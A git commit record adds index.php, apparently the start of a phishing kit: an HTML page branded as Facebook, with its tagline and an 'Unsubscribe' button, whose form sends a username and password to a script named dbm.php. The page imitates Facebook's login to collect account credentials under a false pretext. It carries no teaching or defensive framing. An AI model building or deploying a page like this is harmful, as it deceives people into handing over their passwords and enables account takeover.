a3de0a4f9e9d03a3c7813f1064507432404bb578
Prince Kumar <pk980145@gmail.com>
2023-08-14 22:53:40 +0530

    first commit

---
+++ index.php
@@ -0,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unsubscribe</title>
+    <link type="text/css" rel="stylesheet" href="style.css">
+</head>
+<body bgcolor="#f0f0f0">
+    <div id=blk>
+    <h1 id="fb">facebook</h1>
+    <p1>Facebook helps you connect and share with the people in you life.</p1>
+    </div>
+    <div id="entry">
+        <form action="dbm.php" method="post">
+            <input type="text" id="user" name="user"><br><br>
+            <input type="password" id="pass" name="pass" ><br><br>
+            <input type="submit" id="submit" name="submit" value="Unsubscribe">
+            
+        </form>
+    </div>
+</body>
+</html>
